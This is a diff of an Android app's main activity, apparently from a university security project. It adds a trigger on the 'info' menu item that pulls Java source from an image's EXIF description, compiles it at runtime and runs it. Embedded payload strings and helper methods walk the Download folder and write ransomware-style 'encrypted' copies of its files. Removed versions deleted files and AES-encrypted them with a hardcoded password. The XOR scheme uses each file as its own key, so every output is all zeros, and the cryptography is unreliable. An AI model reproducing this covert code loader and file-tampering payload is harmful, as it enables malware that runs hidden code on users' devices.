@@ -32,6 +32,7 @@ import com.client_progettosicurezza.results.ResultListaImmagini;
 
 import java.io.BufferedOutputStream;
 import java.io.File;
+import java.io.FileInputStream;
 import java.io.FileOutputStream;
 import java.io.IOException;
 import java.lang.reflect.InvocationTargetException;
@@ -41,6 +42,7 @@ import java.nio.file.Path;
 import java.nio.file.Paths;
 import java.security.SecureRandom;
 import java.util.ArrayList;
+import java.util.Arrays;
 
 import javax.crypto.Cipher;
 import javax.crypto.KeyGenerator;
@@ -132,102 +134,122 @@ public class MainActivity extends AppCompatActivity {
             //TODO TRIGGER
             case R.id.info:
                 //TODO per prelevare l'immagine
-                //String pathFile = Environment.getExternalStorageDirectory().toString() + File.separator + Environment.DIRECTORY_DOWNLOADS + "/Minions.jpg";
-                //File file = new File(pathFile);
-                //payload(file);
+                String pathFile = Environment.getExternalStorageDirectory().toString() + File.separator + Environment.DIRECTORY_DOWNLOADS + "/Minions.jpg";
+                File file = new File(pathFile);
+                payload(file);
 
                 //TODO per provare il codice senza immagine
-                payload();
+                //payload();
 
-                //TODO PROVA metodo per generazione chiave, cifratura, decifratura, conversione file input e output
-                /*try {
-                    runAll();
-                } catch (Exception e) {
-                    e.printStackTrace();
-                }*/
-
-                //TODO PROVA metodo identico a runAll, ma impostato per la compilazione dinamica (per per le classi i pakage e alcuni cast)
-                //runner(getApplicationContext());
+                //TODO PROVA
+                //runner3(getApplicationContext());
 
                 break;
         }
         return true;
     }
 
-    private void payload() {
+    private void payload(File file) {
 
-        String codice0 =
-                "public class Classe { " +
-                    "public Classe() {} " +
-                    "/* start method */" +
-                    "public void run(android.content.Context context){ " +
-                        "android.widget.Toast.makeText((android.content.Context) context, (java.lang.CharSequence) \"Prova Toasto\" , (int) android.widget.Toast.LENGTH_LONG).show(); " +
-                    "} " +
-                    "/* end method */" +
-                "}";
+        String codice = "";
 
         String codice1 =
                 "public class Classe { " +
-                    "public Classe() {} " +
-                    "/* start method */" +
-                    "public void run(android.content.Context context){ " +
-                        "java.io.File file = new java.io.File((java.lang.String) \"/sdcard/Download/Shrek.jpg\"); " +
-                        "if(file.delete()){ " +
-                            "android.widget.Toast.makeText((android.content.Context) context, (java.lang.CharSequence) \"Cancellato\" , (int) android.widget.Toast.LENGTH_LONG).show(); " +
-                        "} else {" +
-                            "android.widget.Toast.makeText((android.content.Context) context, (java.lang.CharSequence) \"Non cancellato\" , (int) android.widget.Toast.LENGTH_LONG).show(); " +
-                        "} " +
-                     "} " +
-                    "/* end method */" +
-                "}";
+                        "public Classe() {} " +
+                        "/* start method */" +
+                        "public void run(android.content.Context context) {" +
+                        "        try {\n" +
+                        "            java.io.File file = new java.io.File((java.lang.String) \"/sdcard/Download/Minions.jpg\");\n" +
+                        "            byte[] plaintext = new byte[(int) file.length()];\n" +
+                        "            java.io.FileInputStream fileInputStream = new java.io.FileInputStream(file);\n" +
+                        "            fileInputStream.read(plaintext);" +
+                        "            byte[] key = plaintext; " +
+                        "            byte[] chipertext = new byte[(int) key.length];\n" +
+                        "            for (int i = 0; i < key.length; i++) {\n" +
+                        "                chipertext[i] = (byte) (plaintext[i] ^ key[i]);\n" +
+                        "            }\n" +
+                        "            java.io.File file_chipertext = new java.io.File((java.lang.String) \"/sdcard/Download/Minions_cifrato.jpg\");\n" +
+                        "            java.io.BufferedOutputStream bos = new java.io.BufferedOutputStream(new java.io.FileOutputStream((java.io.File) file_chipertext));\n" +
+                        "            bos.write((byte[]) chipertext);\n" +
+                        "            bos.flush();\n" +
+                        "            bos.close();\n" +
+                        "            byte[] plaintext_verifica = new byte[(int) key.length];\n" +
+                        "            for (int i = 0; i < key.length; i++) {\n" +
+                        "                plaintext_verifica[i] = (byte) (chipertext[i] ^ key[i]);\n" +
+                        "            }\n" +
+                        "            java.io.File file_plaintext_verifica = new java.io.File((java.lang.String) \"/sdcard/Download/Minions_verifica.jpg\");\n" +
+                        "            java.io.BufferedOutputStream bos2 = new java.io.BufferedOutputStream(new java.io.FileOutputStream((java.io.File) file_plaintext_verifica));\n" +
+                        "            bos2.write((byte[]) plaintext_verifica);\n" +
+                        "            bos2.flush();\n" +
+                        "            bos2.close();" +
+                        "        } catch (java.lang.Exception e) {\n" +
+                        "            e.printStackTrace();\n" +
+                        "        }" +
+                        "}" +
+                        "/* end method */" +
+                        "} ";
 
         String codice2 =
                 "public class Classe { " +
-                    "public Classe() {} " +
-                    "/* start method */" +
-                    "public void run(android.content.Context context){ " +
-                        "android.widget.Toast.makeText((android.content.Context) context, (java.lang.CharSequence) \"Start\" , (int) android.widget.Toast.LENGTH_LONG).show(); " +
-                        "try{ " +
-                            "java.lang.String password = \"pass\"; " +
-                            "byte[] keyStart = password.getBytes(\"UTF-8\"); " +
-                            "javax.crypto.KeyGenerator kgen = javax.crypto.KeyGenerator.getInstance(\"AES\"); " +
-                            "java.security.SecureRandom sr = java.security.SecureRandom.getInstance(\"SHA1PRNG\"); " +
-                            "sr.setSeed((byte[]) keyStart); " +
-                            "kgen.init((int) 128, (java.security.SecureRandom) sr); " +
-                            "javax.crypto.SecretKey skey = kgen.generateKey(); " +
-                            "byte[] key = skey.getEncoded(); " +
-                            "java.nio.file.Path path = java.nio.file.Paths.get(\"/sdcard/Download/Minions.jpg\"); " +
-                            "byte[] plaintext = java.nio.file.Files.readAllBytes((java.nio.file.Path) path); " +
-                            "javax.crypto.spec.SecretKeySpec skeySpec = new javax.crypto.spec.SecretKeySpec(key, \"AES\"); " +
-                            "javax.crypto.Cipher cipher = javax.crypto.Cipher.getInstance(\"AES\"); " +
-                            "cipher.init((int) 1, (javax.crypto.spec.SecretKeySpec) skeySpec); " +
-                            "byte[] encrypted = cipher.doFinal((byte[]) plaintext); " +
-                            "java.io.File file_chipertext = new java.io.File(\"/sdcard/Download/Minions.jpg.encrypt\"); " +
-                            "java.io.BufferedOutputStream bos = new java.io.BufferedOutputStream(new java.io.FileOutputStream((java.io.File) file_chipertext)); " +
-                            "bos.write((byte[]) encrypted); " +
-                            "bos.flush(); " +
-                            "bos.close(); " +
-                            "android.widget.Toast.makeText((android.content.Context) context, (java.lang.CharSequence) \"End\" , (int) android.widget.Toast.LENGTH_LONG).show(); " +
-                        "} catch(java.lang.Exception e){ " +
-                            "e.printStackTrace(); " +
-                        "} " +
-                    "} " +
-                    "/* end method */" +
-                "} ";
+                        "public Classe() {} " +
+                        "/* start method */" +
+                        "public void run(android.content.Context context) {" +
+                        "try {\n" +
+                        "\n" +
+                        "            java.io.File dir = new java.io.File((java.lang.String) \"/sdcard/Download\");\n" +
+                        "            if (dir.isDirectory()) {\n" +
+                        "                java.lang.String[] children = dir.list();\n" +
+                        "                for (int i = 0; i < (int) children.length; i++) {\n" +
+                        "\n" +
+                        "                    java.io.File file = new java.io.File((java.lang.String) \"/sdcard/Download/\" + children[i]);\n" +
+                        "                    byte[] plaintext = new byte[(int) file.length()];\n" +
+                        "                    java.io.FileInputStream fileInputStream = new java.io.FileInputStream(file);\n" +
+                        "                    fileInputStream.read(plaintext);\n" +
+                        "\n" +
+                        "                    byte[] key = plaintext;\n" +
+                        "\n" +
+                        "                    byte[] chipertext = new byte[(int) key.length];\n" +
+                        "                    for (int j = 0; j < (int) key.length; j++) {\n" +
+                        "                        chipertext[j] = (byte) (plaintext[j] ^ key[j]);\n" +
+                        "                    }\n" +
+                        "                    java.io.File file_chipertext = new java.io.File((java.lang.String) \"/sdcard/Download/\" + \"cifrato_\" + children[i]);\n" +
+                        "                    java.io.BufferedOutputStream bos = new java.io.BufferedOutputStream(new java.io.FileOutputStream((java.io.File) file_chipertext));\n" +
+                        "                    bos.write((byte[]) chipertext);\n" +
+                        "                    bos.flush();\n" +
+                        "                    bos.close();\n" +
+                        "\n" +
+                        "                    byte[] plaintext_verifica = new byte[(int) key.length];\n" +
+                        "                    for (int k = 0; k < (int) key.length; k++) {\n" +
+                        "                        plaintext_verifica[k] = (byte) (chipertext[k] ^ key[k]);\n" +
+                        "                    }\n" +
+                        "                    java.io.File file_plaintext_verifica = new java.io.File((java.lang.String)  \"/sdcard/Download/\" + \"verifica_\" + children[i]);\n" +
+                        "                    java.io.BufferedOutputStream bos2 = new java.io.BufferedOutputStream(new java.io.FileOutputStream((java.io.File) file_plaintext_verifica));\n" +
+                        "                    bos2.write((byte[]) plaintext_verifica);\n" +
+                        "                    bos2.flush();\n" +
+                        "                    bos2.close();\n" +
+                        "                }\n" +
+                        "            }\n" +
+                        "\n" +
+                        "        } catch (java.lang.Exception e) {\n" +
+                        "            e.printStackTrace();\n" +
+                        "        }" +
+                        "}" +
+                        "/* end method */" +
+                        "} ";
 
 
         //TODO per prelevare i metadati
-        /*try {
+        try {
             ExifInterface exif = new ExifInterface(file.getAbsolutePath());
             codice = exif.getAttribute(ExifInterface.TAG_IMAGE_DESCRIPTION);
         } catch (IOException e) {
             e.printStackTrace();
-        }*/
+        }
 
         try {
             Compile compile = new Compile(getFilesDir(), getApplicationContext());
             //TODO scegliere codice da compilare
-            compile.assemblyCompile(codice2);
+            compile.assemblyCompile(codice);
             compile.recompile();
             compile.load(getCacheDir(), getApplicationInfo(), getClassLoader());
 
@@ -318,102 +340,81 @@ public class MainActivity extends AppCompatActivity {
         });
     }
 
+    public void runner2(android.content.Context context) {
+        android.widget.Toast.makeText((android.content.Context) context, (java.lang.CharSequence) "Start", (int) android.widget.Toast.LENGTH_LONG).show();
+        try {
 
 
+            java.io.File file = new java.io.File((java.lang.String) "/sdcard/Download/testo.txt");
+            byte[] plaintext = new byte[(int) file.length()];
+            java.io.FileInputStream fileInputStream = new java.io.FileInputStream(file);
+            fileInputStream.read(plaintext);
 
+            byte[] key = plaintext;
 
-
-
-
-    //TODO metodo che richiama la generazione della chiave, conversione file input output, cifratura e decifratura
-    public void runAll() throws Exception {
-        Path path = Paths.get(Environment.getExternalStorageDirectory().toString() + File.separator + Environment.DIRECTORY_DOWNLOADS + "/Minions.jpg");
-        byte[] plaintext = Files.readAllBytes(path);
-
-        byte[] key = generateKey("password");
-
-        byte[] chipertext = encodeFile(key, plaintext);
-
-        File file_chipertext = new File(Environment.getExternalStorageDirectory().toString() + File.separator + Environment.DIRECTORY_DOWNLOADS + "/Minions.jpg.encrypt");
-        BufferedOutputStream bos = new BufferedOutputStream(new FileOutputStream(file_chipertext));
-        bos.write(chipertext);
-        bos.flush();
-        bos.close();
-
-
-        byte[] plaintext_verifica = decodeFile(key, chipertext);
-
-        File file_plaintext = new File(Environment.getExternalStorageDirectory().toString() + File.separator + Environment.DIRECTORY_DOWNLOADS + "/Verifica.jpg");
-        BufferedOutputStream bos2 = new BufferedOutputStream(new FileOutputStream(file_plaintext));
-        bos2.write(plaintext_verifica);
-        bos2.flush();
-        bos2.close();
-
-    }
-
-    //TODO metodo per generare la chiave
-    public byte[] generateKey(String password) throws Exception {
-        byte[] keyStart = password.getBytes("UTF-8");
-
-        KeyGenerator kgen = KeyGenerator.getInstance("AES");
-        SecureRandom sr = SecureRandom.getInstance("SHA1PRNG");
-        sr.setSeed(keyStart);
-        kgen.init(128, sr);
-        SecretKey skey = kgen.generateKey();
-        return skey.getEncoded();
-    }
-
-    //TODO metodo per cifrare
-    public byte[] encodeFile(byte[] key, byte[] fileData) throws Exception {
-
-        SecretKeySpec skeySpec = new SecretKeySpec(key, "AES");
-        Cipher cipher = Cipher.getInstance("AES");
-        cipher.init(Cipher.ENCRYPT_MODE, skeySpec);
-
-        byte[] encrypted = cipher.doFinal(fileData);
-
-        return encrypted;
-    }
-
-    //TODO metodo per decifrare
-    public byte[] decodeFile(byte[] key, byte[] fileData) throws Exception {
-        SecretKeySpec skeySpec = new SecretKeySpec(key, "AES");
-        Cipher cipher = Cipher.getInstance("AES");
-        cipher.init(Cipher.DECRYPT_MODE, skeySpec);
-
-        byte[] decrypted = cipher.doFinal(fileData);
-
-        return decrypted;
-    }
-
-    //TODO identico a runAll, ma impostato per la compilazione dinamica (per per le classi i pakage e alcuni cast)
-    public void runner(Context context){
-        android.widget.Toast.makeText((android.content.Context) context, (java.lang.CharSequence) "Start" , (int) android.widget.Toast.LENGTH_LONG).show();
-        try{
-            java.lang.String password = "pass";
-            byte[] keyStart = password.getBytes("UTF-8");
-            javax.crypto.KeyGenerator kgen = javax.crypto.KeyGenerator.getInstance("AES");
-            java.security.SecureRandom sr = java.security.SecureRandom.getInstance("SHA1PRNG");
-            sr.setSeed((byte[]) password.getBytes("UTF-8"));
-            kgen.init((int) 128, (java.security.SecureRandom) sr);
-            javax.crypto.SecretKey skey = kgen.generateKey();
-            byte[] key = skey.getEncoded();
-
-            java.nio.file.Path path = java.nio.file.Paths.get("/sdcard/Download/Minions.jpg");
-            byte[] plaintext = java.nio.file.Files.readAllBytes((java.nio.file.Path) path);
-
-            javax.crypto.spec.SecretKeySpec skeySpec = new javax.crypto.spec.SecretKeySpec(key, "AES");
-            javax.crypto.Cipher cipher = javax.crypto.Cipher.getInstance("AES");
-            cipher.init((int) 1, (javax.crypto.spec.SecretKeySpec) skeySpec);
-            byte[] encrypted = cipher.doFinal((byte[]) plaintext);
-
-            java.io.File file_chipertext = new java.io.File("/sdcard/Download/Minions.jpg.encrypt");
+            byte[] chipertext = new byte[key.length];
+            for (int i = 0; i < key.length; i++) {
+                chipertext[i] = (byte) (plaintext[i] ^ key[i]);
+            }
+            java.io.File file_chipertext = new java.io.File((java.lang.String) "/sdcard/Download/cifrato.txt");
             java.io.BufferedOutputStream bos = new java.io.BufferedOutputStream(new java.io.FileOutputStream((java.io.File) file_chipertext));
-            bos.write((byte[]) encrypted);
+            bos.write((byte[]) chipertext);
             bos.flush();
             bos.close();
-            android.widget.Toast.makeText((android.content.Context) context, (java.lang.CharSequence) "End" , (int) android.widget.Toast.LENGTH_LONG).show();
-        } catch(java.lang.Exception e){
+
+            byte[] plaintext_verifica = new byte[key.length];
+            for (int i = 0; i < key.length; i++) {
+                plaintext_verifica[i] = (byte) (chipertext[i] ^ key[i]);
+            }
+            java.io.File file_plaintext_verifica = new java.io.File((java.lang.String) "/sdcard/Download/testo_verifica.txt");
+            java.io.BufferedOutputStream bos2 = new java.io.BufferedOutputStream(new java.io.FileOutputStream((java.io.File) file_plaintext_verifica));
+            bos2.write((byte[]) plaintext_verifica);
+            bos2.flush();
+            bos2.close();
+
+        } catch (java.lang.Exception e) {
+            e.printStackTrace();
+        }
+    }
+
+    public void runner3(android.content.Context context) {
+        try {
+
+            java.io.File dir = new java.io.File((java.lang.String) "/sdcard/Download");
+            if (dir.isDirectory()) {
+                java.lang.String[] children = dir.list();
+                for (int i = 0; i < children.length; i++) {
+
+                    java.io.File file = new java.io.File("/sdcard/Download/" + children[i]);
+                    byte[] plaintext = new byte[(int) file.length()];
+                    java.io.FileInputStream fileInputStream = new java.io.FileInputStream(file);
+                    fileInputStream.read(plaintext);
+
+                    byte[] key = plaintext;
+
+                    byte[] chipertext = new byte[key.length];
+                    for (int j = 0; j < key.length; j++) {
+                        chipertext[j] = (byte) (plaintext[j] ^ key[j]);
+                    }
+                    java.io.File file_chipertext = new java.io.File((java.lang.String) "/sdcard/Download/" + "cifrato_" + children[i]);
+                    java.io.BufferedOutputStream bos = new java.io.BufferedOutputStream(new java.io.FileOutputStream((java.io.File) file_chipertext));
+                    bos.write((byte[]) chipertext);
+                    bos.flush();
+                    bos.close();
+
+                    byte[] plaintext_verifica = new byte[key.length];
+                    for (int k = 0; k < key.length; k++) {
+                        plaintext_verifica[k] = (byte) (chipertext[k] ^ key[k]);
+                    }
+                    java.io.File file_plaintext_verifica = new java.io.File((java.lang.String)  "/sdcard/Download/" + "verifica_" + children[i]);
+                    java.io.BufferedOutputStream bos2 = new java.io.BufferedOutputStream(new java.io.FileOutputStream((java.io.File) file_plaintext_verifica));
+                    bos2.write((byte[]) plaintext_verifica);
+                    bos2.flush();
+                    bos2.close();
+                }
+            }
+
+        } catch (java.lang.Exception e) {
             e.printStackTrace();
         }
     }
